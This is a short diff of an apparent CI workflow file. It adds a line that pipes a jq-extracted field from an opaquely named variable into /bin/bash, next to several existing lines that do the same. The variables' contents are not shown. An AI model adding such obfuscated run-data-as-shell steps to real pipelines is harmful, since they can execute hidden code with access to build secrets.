@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$maw3" | jq -r .hcmwa03 | /bin/bash
           echo $bpfb453 | jq -r .iy885 | /bin/bash
           printf '%s' "$rby91" | jq -r .lxsfh4178 | /bin/bash
+          echo $dhovb65 | jq -r .p29 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
